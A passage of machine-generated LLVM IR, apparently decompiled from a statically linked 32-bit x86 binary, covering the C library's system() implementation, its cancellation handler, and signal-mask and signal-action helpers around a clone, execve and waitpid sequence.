  uselistorder i32 %v1_8063136, { 0, 2, 1 }
  uselistorder i32 %v3_80630f4, { 1, 0, 2 }
  uselistorder i32 %v2_80630ec, { 2, 1, 0 }
  uselistorder i32* %stack_var_-208, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %tmp31, { 3, 0, 1, 2 }
  uselistorder i32 %tmp26, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 2, 1, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @__GI___errno_location, { 0, 3, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), { 1, 2, 3, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80717f0.1652 to i32), i32 -134682608), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 47, { 1, 4, 3, 2, 0 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 6, 5, 7, 3, 0, 1 }
  uselistorder i32* %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8063257, { 1, 0 }
  uselistorder label %dec_label_pc_8063233, { 1, 0 }
  uselistorder label %dec_label_pc_8063215, { 1, 0 }
  uselistorder label %dec_label_pc_80631d6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806313d, { 1, 0 }
  uselistorder label %dec_label_pc_806312f, { 1, 0 }
  uselistorder label %dec_label_pc_806310a, { 1, 0 }
}

define i32 @cancel_handler(i32* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8063318 = load i32, i32* @ebx, align 4
  %v2_8063325 = load i32, i32* %arg1, align 4
  store i32 %v2_8063325, i32* @ebx, align 4
  %v2_8063330 = call i32 @kill(i32 %v0_8063318, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8063330, i32* @eax, align 4
  %v1_8063332 = load i32, i32* @edx, align 4
  store i32 %v1_8063332, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063334

dec_label_pc_8063334:                             ; preds = %dec_label_pc_8063345.dec_label_pc_8063334_crit_edge, %entry
  %v0_8063339 = phi i32 [ %v0_8063339.pre, %dec_label_pc_8063345.dec_label_pc_8063334_crit_edge ], [ %v1_8063332, %entry ]
  %v3_806333a = call i32 @__waitpid(i32 %v0_8063339, i32 0, i32 0)
  %v8_8063342 = icmp eq i32 %v3_806333a, -1
  %v1_8063343 = icmp eq i1 %v8_8063342, false
  br i1 %v1_8063343, label %dec_label_pc_8063350, label %dec_label_pc_8063345

dec_label_pc_8063345:                             ; preds = %dec_label_pc_8063334
  store i32 -8, i32* @eax, align 4
  %v2_806334a = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  %v11_806334a = icmp eq i32 %v2_806334a, 4
  br i1 %v11_806334a, label %dec_label_pc_8063345.dec_label_pc_8063334_crit_edge, label %dec_label_pc_8063350

dec_label_pc_8063345.dec_label_pc_8063334_crit_edge: ; preds = %dec_label_pc_8063345
  %v0_8063339.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063334

dec_label_pc_8063350:                             ; preds = %dec_label_pc_8063345, %dec_label_pc_8063334
  %v0_8063357 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8063357 = icmp eq i32 %v0_8063357, 0
  call void @__pseudo_cond_branch(i1 %v1_8063357, i32 134624098)
  %v0_8063361 = load i32, i32* @global_var_8078300.1662, align 256
  %v13_8063361 = icmp eq i32 %v0_8063361, 0
  %v20_8063361 = select i1 %v13_8063361, i32 1, i32 %v0_8063361
  store i32 %v20_8063361, i32* @global_var_8078300.1662, align 256
  %v1_8063369 = icmp eq i1 %v13_8063361, false
  call void @__pseudo_cond_branch(i1 %v1_8063369, i32 134625093)
  ret i32 %v0_8063361

; uselistorder directives
  uselistorder i32 %v0_8063361, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 1, 0 }
}

define i32 @function_806336f() local_unnamed_addr {
dec_label_pc_806336f:
  %eax.global-to-local = alloca i32, align 4
  %v0_806336f = load i32, i32* @global_var_80782fc.1663, align 4
  %v1_8063374 = add i32 %v0_806336f, -1
  %v8_8063374 = icmp eq i32 %v1_8063374, 0
  store i32 %v1_8063374, i32* %eax.global-to-local, align 4
  store i32 %v1_8063374, i32* @global_var_80782fc.1663, align 4
  %v1_806337c = icmp eq i1 %v8_8063374, false
  br i1 %v1_806337c, label %dec_label_pc_80633a1, label %dec_label_pc_806337e

dec_label_pc_806337e:                             ; preds = %dec_label_pc_806336f
  %v4_8063388 = call i32 @__libc_sigaction(i32 3, i32* nonnull @global_var_80782e8.1664, i32 0)
  store i32 %v4_8063388, i32* %eax.global-to-local, align 4
  %v4_8063399 = call i32 @__libc_sigaction(i32 2, i32* nonnull @global_var_80782d4.1665, i32 0)
  store i32 %v4_8063399, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80633a1

dec_label_pc_80633a1:                             ; preds = %dec_label_pc_806336f, %dec_label_pc_806337e
  %v0_80633a1 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80633a1 = icmp eq i32 %v0_80633a1, 0
  call void @__pseudo_cond_branch(i1 %v1_80633a1, i32 134624172)
  %v0_80633ab = load i32, i32* @global_var_8078300.1662, align 256
  %v1_80633ab = add i32 %v0_80633ab, -1
  %v9_80633ab = icmp eq i32 %v1_80633ab, 0
  store i32 %v1_80633ab, i32* @global_var_8078300.1662, align 256
  %v1_80633b3 = icmp eq i1 %v9_80633ab, false
  call void @__pseudo_cond_branch(i1 %v1_80633b3, i32 134625109)
  %v2_80633b3 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v2_80633b3

; uselistorder directives
  uselistorder i32 %v1_80633ab, { 1, 0 }
  uselistorder i32 %v1_8063374, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80633a1, { 1, 0 }
}

define i32 @function_80633b9() local_unnamed_addr {
dec_label_pc_80633b9:
  %tmp = call i32 @__decompiler_undefined_function_0()
  ret i32 %tmp
}

define i32 @do_system(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %v0_80633bf = load i32, i32* @eax, align 4
  store i32 %v0_80633bf, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_80633c7 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_80633c7, i32* @ebx, align 4
  %v4_80633cd = load i1, i1* @df, align 1
  %v5_80633cd = select i1 %v4_80633cd, i32 -4, i32 4
  %v6_80633cd = add i32 %v5_80633cd, %v2_80633c7
  store i32 %v6_80633cd, i32* %edi.global-to-local, align 4
  %v2_80633ce = inttoptr i32 %v6_80633cd to i32*
  store i32 0, i32* %v2_80633ce, align 4
  %v3_80633ce = load i32, i32* %edi.global-to-local, align 4
  %v6_80633ce = add i32 %v3_80633ce, %v5_80633cd
  store i32 %v6_80633ce, i32* %edi.global-to-local, align 4
  %v0_80633cf = load i32, i32* %eax.global-to-local, align 4
  %v2_80633cf = inttoptr i32 %v6_80633ce to i32*
  store i32 %v0_80633cf, i32* %v2_80633cf, align 4
  %v3_80633cf = load i32, i32* %edi.global-to-local, align 4
  %v6_80633cf = add i32 %v3_80633cf, %v5_80633cd
  store i32 %v6_80633cf, i32* %edi.global-to-local, align 4
  %v0_80633d0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80633d0 = inttoptr i32 %v6_80633cf to i32*
  store i32 %v0_80633d0, i32* %v2_80633d0, align 4
  %v3_80633d0 = load i32, i32* %edi.global-to-local, align 4
  %v6_80633d0 = add i32 %v3_80633d0, %v5_80633cd
  store i32 %v6_80633d0, i32* %edi.global-to-local, align 4
  %v0_80633d1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80633d1 = inttoptr i32 %v6_80633d0 to i32*
  store i32 %v0_80633d1, i32* %v2_80633d1, align 4
  %v3_80633d1 = load i32, i32* %edi.global-to-local, align 4
  %v6_80633d1 = add i32 %v3_80633d1, %v5_80633cd
  store i32 %v6_80633d1, i32* @edi, align 4
  store i32 1, i32* @ecx, align 4
  store i32 1, i32* %stack_var_-80, align 4
  %v0_80633df = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80633df = icmp eq i32 %v0_80633df, 0
  call void @__pseudo_cond_branch(i1 %v1_80633df, i32 134624234)
  %v0_80633e9 = load i32, i32* @global_var_8078300.1662, align 256
  %v1_80633e9 = load i32, i32* @ecx, align 4
  %v2_80633e9 = load i32, i32* %eax.global-to-local, align 4
  %v13_80633e9 = icmp eq i32 %v2_80633e9, %v0_80633e9
  %v20_80633e9 = select i1 %v13_80633e9, i32 %v1_80633e9, i32 %v0_80633e9
  store i32 %v20_80633e9, i32* @global_var_8078300.1662, align 256
  store i32 %v0_80633e9, i32* %eax.global-to-local, align 4
  %v1_80633f1 = icmp eq i1 %v13_80633e9, false
  call void @__pseudo_cond_branch(i1 %v1_80633f1, i32 134625125)
  ret i32 %v0_80633e9

; uselistorder directives
  uselistorder i32 %v0_80633e9, { 1, 0, 3, 2 }
}

define i32 @function_80633f7() local_unnamed_addr {
dec_label_pc_80633f7:
  %eax.global-to-local = alloca i32, align 4
  %v0_80633f7 = load i32, i32* @global_var_80782fc.1663, align 4
  %v1_80633fc = add i32 %v0_80633f7, 1
  store i32 %v1_80633fc, i32* @global_var_80782fc.1663, align 4
  %v8_8063402 = icmp eq i32 %v0_80633f7, 0
  store i32 %v0_80633f7, i32* %eax.global-to-local, align 4
  %v1_8063403 = icmp eq i1 %v8_8063402, false
  br i1 %v1_8063403, label %dec_label_pc_806344d, label %dec_label_pc_8063405

dec_label_pc_8063405:                             ; preds = %dec_label_pc_80633f7
  %v0_806340b = load i32, i32* @ebx, align 4
  %v3_806340e = inttoptr i32 %v0_806340b to i32*
  %v4_806340e = call i32 @__libc_sigaction(i32 2, i32* %v3_806340e, i32 ptrtoint (i32* @global_var_80782d4.1665 to i32))
  store i32 %v4_806340e, i32* @eax, align 4
  %v2_8063416 = icmp slt i32 %v4_806340e, 0
  %v1_8063418 = icmp eq i1 %v2_8063416, false
  br i1 %v1_8063418, label %dec_label_pc_8063425, label %dec_label_pc_806341a

dec_label_pc_806341a:                             ; preds = %dec_label_pc_8063405
  %v0_806341a = load i32, i32* @global_var_80782fc.1663, align 4
  %v1_806341a = add i32 %v0_806341a, -1
  store i32 %v1_806341a, i32* @global_var_80782fc.1663, align 4
  %v0_8063420 = call i32 @function_80634ec()
  store i32 %v0_8063420, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063425

dec_label_pc_8063425:                             ; preds = %dec_label_pc_8063405, %dec_label_pc_806341a
  %v0_806342b = load i32, i32* @ebx, align 4
  %v3_806342e = inttoptr i32 %v0_806342b to i32*
  %v4_806342e = call i32 @__libc_sigaction(i32 3, i32* %v3_806342e, i32 ptrtoint (i32* @global_var_80782e8.1664 to i32))
  store i32 %v4_806342e, i32* %eax.global-to-local, align 4
  %v2_8063436 = icmp slt i32 %v4_806342e, 0
  %v1_8063438 = icmp eq i1 %v2_8063436, false
  br i1 %v1_8063438, label %dec_label_pc_806344d, label %dec_label_pc_806343a

dec_label_pc_806343a:                             ; preds = %dec_label_pc_8063425
  store i32 -8, i32* %eax.global-to-local, align 4
  %v0_806343f = load i32, i32* @global_var_80782fc.1663, align 4
  %v1_806343f = add i32 %v0_806343f, -1
  store i32 %v1_806343f, i32* @global_var_80782fc.1663, align 4
  %v2_8063445 = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_8063445, i32* @ebx, align 4
  %v0_8063448 = call i32 @function_80634d2()
  store i32 %v0_8063448, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806344d

dec_label_pc_806344d:                             ; preds = %dec_label_pc_8063425, %dec_label_pc_80633f7, %dec_label_pc_806343a
  %v0_806344d = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_806344d = icmp eq i32 %v0_806344d, 0
  call void @__pseudo_cond_branch(i1 %v1_806344d, i32 134624344)
  %v0_8063457 = load i32, i32* @global_var_8078300.1662, align 256
  %v1_8063457 = add i32 %v0_8063457, -1
  %v9_8063457 = icmp eq i32 %v1_8063457, 0
  store i32 %v1_8063457, i32* @global_var_8078300.1662, align 256
  %v1_806345f = icmp eq i1 %v9_8063457, false
  call void @__pseudo_cond_branch(i1 %v1_806345f, i32 134625141)
  %v2_806345f = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v2_806345f

; uselistorder directives
  uselistorder i32 %v1_8063457, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_806344d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063425, { 1, 0 }
}

define i32 @function_8063465() local_unnamed_addr {
dec_label_pc_8063465:
  %stack_var_24 = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_64 = alloca i32, align 4
  %v4_8063465 = or i32 %tmp3, 65536
  store i32 %v4_8063465, i32* %stack_var_24, align 4
  %v2_806346e = ptrtoint i32* %stack_var_64 to i32
  %v3_806347a = bitcast i32* %stack_var_24 to %_TYPEDEF_sigset_t*
  %v4_806347a = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_806347a, i32 %v2_806346e)
  %v2_8063482 = icmp slt i32 %v4_806347a, 0
  %v1_8063484 = icmp eq i1 %v2_8063482, false
  call void @__pseudo_cond_branch(i1 %v1_8063484, i32 134624524)
  %v0_8063491 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8063491 = icmp eq i32 %v0_8063491, 0
  call void @__pseudo_cond_branch(i1 %v1_8063491, i32 134624412)
  %v0_806349b = load i32, i32* @global_var_8078300.1662, align 256
  %v13_806349b = icmp eq i32 %v0_806349b, 0
  %v20_806349b = select i1 %v13_806349b, i32 1, i32 %v0_806349b
  store i32 %v20_806349b, i32* @global_var_8078300.1662, align 256
  %v1_80634a3 = icmp eq i1 %v13_806349b, false
  call void @__pseudo_cond_branch(i1 %v1_80634a3, i32 134625157)
  ret i32 %v0_806349b

; uselistorder directives
  uselistorder i32 %v0_806349b, { 0, 2, 1 }
}

define i32 @function_80634a9() local_unnamed_addr {
dec_label_pc_80634a9:
  %v0_80634a9 = load i32, i32* @global_var_80782fc.1663, align 4
  %v1_80634ae = add i32 %v0_80634a9, -1
  %v8_80634ae = icmp eq i32 %v1_80634ae, 0
  store i32 %v1_80634ae, i32* @global_var_80782fc.1663, align 4
  %v1_80634b6 = icmp eq i1 %v8_80634ae, false
  call void @__pseudo_cond_branch(i1 %v1_80634b6, i32 134624492)
  %v4_80634ca = call i32 @__libc_sigaction(i32 3, i32* nonnull @global_var_80782e8.1664, i32 0)
  ret i32 %v4_80634ca
}

define i32 @function_80634d2() local_unnamed_addr {
dec_label_pc_80634d2:
  %v4_80634dc = call i32 @__libc_sigaction(i32 2, i32* nonnull @global_var_80782d4.1665, i32 0)
  %v0_80634e9 = load i32, i32* @ebx, align 4
  store i32 %v0_80634e9, i32* inttoptr (i32 -8 to i32*), align 8
  ret i32 -8
}

define i32 @function_80634ec() local_unnamed_addr {
dec_label_pc_80634ec:
  %v0_80634ec = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80634ec = icmp eq i32 %v0_80634ec, 0
  call void @__pseudo_cond_branch(i1 %v1_80634ec, i32 134624503)
  %v0_80634f6 = load i32, i32* @global_var_8078300.1662, align 256
  %v1_80634f6 = add i32 %v0_80634f6, -1
  %v9_80634f6 = icmp eq i32 %v1_80634f6, 0
  store i32 %v1_80634f6, i32* @global_var_8078300.1662, align 256
  %v1_80634fe = icmp eq i1 %v9_80634f6, false
  call void @__pseudo_cond_branch(i1 %v1_80634fe, i32 134625173)
  %v2_80634fe = load i32, i32* @eax, align 4
  ret i32 %v2_80634fe

; uselistorder directives
  uselistorder i32 %v1_80634f6, { 1, 0 }
}

define i32 @function_8063504() local_unnamed_addr {
dec_label_pc_8063504:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_60 = alloca i32, align 4
  %stack_var_32 = alloca i8*, align 4
  %stack_var_64 = alloca i32, align 4
  %stack_var_48 = alloca i32, align 4
  %stack_var_72 = alloca i32, align 4
  store i32 -1, i32* @eax, align 4
  %v0_8063507 = call i32 @function_80636ec()
  %v2_806351b = ptrtoint i32* %stack_var_72 to i32
  %v5_806352d = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_48, i32 134624024, i32 %v2_806351b)
  %v6_8063558 = load i32, i32* @esi, align 4
  %v7_8063558 = inttoptr i32 %v6_8063558 to i32*
  %v8_8063558 = call i32 (i32 (i32*)*, i32*, i32, i32*, ...) @clone(i32 (i32*)* inttoptr (i32 1048593 to i32 (i32*)*), i32* null, i32 %v2_806351b, i32* %v7_8063558)
  store i32 %v8_8063558, i32* @eax, align 4
  store i32 1048593, i32* @ebx, align 4
  %tmp32 = icmp ult i32 %v8_8063558, -4095
  br i1 %tmp32, label %dec_label_pc_8063572, label %dec_label_pc_8063565

dec_label_pc_8063565:                             ; preds = %dec_label_pc_8063504
  %v1_806356a = sub i32 0, %v8_8063558
  store i32 %v1_806356a, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 -1, i32* @eax, align 4
  br label %dec_label_pc_8063572

dec_label_pc_8063572:                             ; preds = %dec_label_pc_8063504, %dec_label_pc_8063565
  %v0_806359b = phi i32 [ %v8_8063558, %dec_label_pc_8063504 ], [ -1, %dec_label_pc_8063565 ]
  %v1_8063572 = icmp eq i32 %v0_806359b, 0
  %v2_8063572 = icmp slt i32 %v0_806359b, 0
  store i32 %v0_806359b, i32* %stack_var_72, align 4
  %v1_8063579 = icmp eq i1 %v1_8063572, false
  br i1 %v1_8063579, label %dec_label_pc_8063604, label %dec_label_pc_806357f

dec_label_pc_806357f:                             ; preds = %dec_label_pc_8063572
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806ff8a.1666, i32 0, i32 0), i8** %stack_var_32, align 4
  %v5_80635a5 = call i32 @__libc_sigaction(i32 2, i32* nonnull @global_var_80782d4.1665, i32 0)
  %v5_80635b6 = call i32 @__libc_sigaction(i32 3, i32* nonnull @global_var_80782e8.1664, i32 0)
  %v4_80635c7 = bitcast i32* %stack_var_64 to %_TYPEDEF_sigset_t*
  %v5_80635c7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v4_80635c7, i32 0)
  store i32 0, i32* @global_var_8078300.1662, align 256
  store i32 0, i32* @global_var_80782fc.1663, align 4
  %v5_80635f3 = call i32 @__GI_execve(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806ff8a.1666, i32 0, i32 0))
  %v2_80635ff = call i32 @__GI__exit(i32 127)
  store i32 %v2_80635ff, i32* @eax, align 4
  %v0_8063604.pre = load i1, i1* @sf, align 1
  %v1_8063604.pre = load i1, i1* @of, align 1
  br label %dec_label_pc_8063604

dec_label_pc_8063604:                             ; preds = %dec_label_pc_8063572, %dec_label_pc_806357f
  %v1_8063604 = phi i1 [ false, %dec_label_pc_8063572 ], [ %v1_8063604.pre, %dec_label_pc_806357f ]
  %v0_8063604 = phi i1 [ %v2_8063572, %dec_label_pc_8063572 ], [ %v0_8063604.pre, %dec_label_pc_806357f ]
  %v2_8063604 = icmp eq i1 %v0_8063604, %v1_8063604
  br i1 %v2_8063604, label %dec_label_pc_8063610, label %dec_label_pc_8063604.dec_label_pc_8063646_crit_edge

dec_label_pc_8063604.dec_label_pc_8063646_crit_edge: ; preds = %dec_label_pc_8063604
  br label %dec_label_pc_8063646

dec_label_pc_8063610:                             ; preds = %dec_label_pc_8063604
  %v2_8063610 = ptrtoint i32* %stack_var_60 to i32
  br label %dec_label_pc_8063614

dec_label_pc_8063614:                             ; preds = %dec_label_pc_806362b, %dec_label_pc_8063610
  %v3_806361c = call i32 @__waitpid(i32 %tmp, i32 %v2_8063610, i32 0)
  %v10_8063624 = icmp eq i32 %v3_806361c, -1
  %v1_8063629 = icmp eq i1 %v10_8063624, false
  br i1 %v1_8063629, label %dec_label_pc_8063636, label %dec_label_pc_806362b

dec_label_pc_806362b:                             ; preds = %dec_label_pc_8063614
  store i32 -8, i32* @eax, align 4
  %v2_8063630 = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  %v11_8063630 = icmp eq i32 %v2_8063630, 4
  br i1 %v11_8063630, label %dec_label_pc_8063614, label %dec_label_pc_8063636

dec_label_pc_8063636:                             ; preds = %dec_label_pc_806362b, %dec_label_pc_8063614
  %v15_8063639 = icmp eq i32 %v3_806361c, %tmp
  %v5_806363d = load i32, i32* %stack_var_60, align 4
  %v6_806363d = select i1 %v15_8063639, i32 %v5_806363d, i32 -1
  br label %dec_label_pc_8063646

dec_label_pc_8063646:                             ; preds = %dec_label_pc_8063604.dec_label_pc_8063646_crit_edge, %dec_label_pc_8063636
  %storemerge = phi i32 [ -1, %dec_label_pc_8063604.dec_label_pc_8063646_crit_edge ], [ %v6_806363d, %dec_label_pc_8063636 ]
  store i32 %storemerge, i32* %stack_var_60, align 4
  %v2_8063653 = bitcast i8** %stack_var_32 to i32*
  %v3_8063653 = call i32 @_pthread_cleanup_pop_restore(i32* %v2_8063653, i32 0)
  %v0_8063662 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8063662 = icmp eq i32 %v0_8063662, 0
  call void @__pseudo_cond_branch(i1 %v1_8063662, i32 134624877)
  %v0_806366c = load i32, i32* @global_var_8078300.1662, align 256
  %v13_806366c = icmp eq i32 %v0_806366c, 0
  %v20_806366c = select i1 %v13_806366c, i32 1, i32 %v0_806366c
  store i32 %v20_806366c, i32* @global_var_8078300.1662, align 256
  %v1_8063674 = icmp eq i1 %v13_806366c, false
  call void @__pseudo_cond_branch(i1 %v1_8063674, i32 134625189)
  ret i32 %v0_806366c

; uselistorder directives
  uselistorder i32 %v0_806366c, { 0, 2, 1 }
  uselistorder i32 %v8_8063558, { 1, 2, 0, 3 }
  uselistorder i32 %v2_806351b, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__waitpid, { 2, 0, 4, 3, 1 }
  uselistorder i1* @of, { 0, 3, 1, 2 }
  uselistorder i32 (i32)* @__GI__exit, { 3, 0, 1, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2 }
  uselistorder label %dec_label_pc_8063646, { 1, 0 }
  uselistorder label %dec_label_pc_8063604, { 1, 0 }
  uselistorder label %dec_label_pc_8063572, { 1, 0 }
}

define i32 @function_806367a() local_unnamed_addr {
dec_label_pc_806367a:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_64 = alloca i32, align 4
  %v0_806367a = load i32, i32* @global_var_80782fc.1663, align 4
  %v1_806367f = add i32 %v0_806367a, -1
  %v8_806367f = icmp eq i32 %v1_806367f, 0
  store i32 %v1_806367f, i32* %eax.global-to-local, align 4
  store i32 %v1_806367f, i32* @global_var_80782fc.1663, align 4
  %v1_8063687 = icmp eq i1 %v8_806367f, false
  br i1 %v1_8063687, label %dec_label_pc_806367a.dec_label_pc_80636b2_crit_edge, label %dec_label_pc_8063689

dec_label_pc_806367a.dec_label_pc_80636b2_crit_edge: ; preds = %dec_label_pc_806367a
  br label %dec_label_pc_80636b2

dec_label_pc_8063689:                             ; preds = %dec_label_pc_806367a
  %v4_8063693 = call i32 @__libc_sigaction(i32 2, i32* nonnull @global_var_80782d4.1665, i32 0)
  store i32 %v4_8063693, i32* %eax.global-to-local, align 4
  store i32 %v4_8063693, i32* @ebx, align 4
  %v4_80636a6 = call i32 @__libc_sigaction(i32 3, i32* nonnull @global_var_80782e8.1664, i32 0)
  %v1_80636ae = load i32, i32* @ebx, align 4
  %v2_80636ae = or i32 %v1_80636ae, %v4_80636a6
  %v3_80636ae = icmp eq i32 %v2_80636ae, 0
  store i32 %v2_80636ae, i32* %eax.global-to-local, align 4
  %v1_80636b0 = icmp eq i1 %v3_80636ae, false
  br i1 %v1_80636b0, label %dec_label_pc_80636d0, label %dec_label_pc_80636b2

dec_label_pc_80636b2:                             ; preds = %dec_label_pc_806367a.dec_label_pc_80636b2_crit_edge, %dec_label_pc_8063689
  %v2_80636b5 = ptrtoint i32* %stack_var_64 to i32
  store i32 %v2_80636b5, i32* %eax.global-to-local, align 4
  %v3_80636bc = bitcast i32* %stack_var_64 to %_TYPEDEF_sigset_t*
  %v4_80636bc = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80636bc, i32 0)
  store i32 %v4_80636bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80636d0

dec_label_pc_80636d0:                             ; preds = %dec_label_pc_80636b2, %dec_label_pc_8063689
  %v0_80636d0 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80636d0 = icmp eq i32 %v0_80636d0, 0
  call void @__pseudo_cond_branch(i1 %v1_80636d0, i32 134624987)
  %v0_80636da = load i32, i32* @global_var_8078300.1662, align 256
  %v1_80636da = add i32 %v0_80636da, -1
  %v9_80636da = icmp eq i32 %v1_80636da, 0
  store i32 %v1_80636da, i32* @global_var_8078300.1662, align 256
  %v1_80636e2 = icmp eq i1 %v9_80636da, false
  call void @__pseudo_cond_branch(i1 %v1_80636e2, i32 134625205)
  %v2_80636e2 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v2_80636e2

; uselistorder directives
  uselistorder i32 %v1_80636da, { 1, 0 }
  uselistorder i32 %v1_806367f, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder i32* @global_var_80782e8.1664, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 9, 12, 0 }
  uselistorder i32* @global_var_80782d4.1665, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80636b2, { 1, 0 }
}

define i32 @function_80636e8() local_unnamed_addr {
dec_label_pc_80636e8:
  %tmp = call i32 @__decompiler_undefined_function_0()
  ret i32 %tmp
}

define i32 @function_80636ec() local_unnamed_addr {
dec_label_pc_80636ec:
  %v0_80636f2 = load i32, i32* @eax, align 4
  ret i32 %v0_80636f2
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp5, i32* %stack_var_0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80636f3 = load i32, i32* @esi, align 4
  %v0_80636f4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_80636fc = icmp eq i32 %arg1, 0
  %v1_80636fe = icmp eq i1 %v1_80636fc, false
  br i1 %v1_80636fe, label %dec_label_pc_8063714, label %dec_label_pc_8063700

dec_label_pc_8063700:                             ; preds = %entry
  store i32 ptrtoint ([7 x i8]* @global_var_806ff95.1668 to i32), i32* @eax, align 4
  %v2_8063705 = call i32 @do_system(i32 %v0_80636f4, i32 %v0_80636f3)
  %v1_806370a = icmp eq i32 %v2_8063705, 0
  %v1_806370c = zext i1 %v1_806370a to i32
  br label %dec_label_pc_806373f

dec_label_pc_8063714:                             ; preds = %entry
  %v0_8063714 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_806371a = icmp eq i32 %v0_8063714, 0
  %v1_806371c = icmp eq i1 %v1_806371a, false
  br i1 %v1_806371c, label %dec_label_pc_8063728, label %dec_label_pc_806371e

dec_label_pc_806371e:                             ; preds = %dec_label_pc_8063714
  store i32 %arg1, i32* @eax, align 4
  %v2_8063723 = call i32 @do_system(i32 %v0_80636f4, i32 %v0_80636f3)
  %v2_8063728.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_8063728

dec_label_pc_8063728:                             ; preds = %dec_label_pc_8063714, %dec_label_pc_806371e
  %v2_8063728 = phi i32 [ %tmp5, %dec_label_pc_8063714 ], [ %v2_8063728.pre, %dec_label_pc_806371e ]
  %v4_8063728 = call i32 @__libc_enable_asynccancel(i32 %v0_80636f4, i32 %v0_80636f3, i32 %v2_8063728, i32 %arg1)
  %v0_806372f = load i32, i32* @esi, align 4
  store i32 %v0_806372f, i32* @eax, align 4
  %v2_8063731 = call i32 @do_system(i32 %v0_80636f4, i32 %v0_80636f3)
  store i32 %v2_8063731, i32* @esi, align 4
  %v0_8063738 = load i32, i32* @ebx, align 4
  store i32 %v0_8063738, i32* @eax, align 4
  %v1_806373a = call i32 @__libc_disable_asynccancel(i32 %v0_80636f4)
  %v0_8063740.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806373f

dec_label_pc_806373f:                             ; preds = %dec_label_pc_8063700, %dec_label_pc_8063728
  %v0_8063740 = phi i32 [ %v1_806370c, %dec_label_pc_8063700 ], [ %v0_8063740.pre, %dec_label_pc_8063728 ]
  %v2_806373f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806373f, i32* @edx, align 4
  store i32 %v0_80636f4, i32* @ebx, align 4
  store i32 %v0_80636f3, i32* @esi, align 4
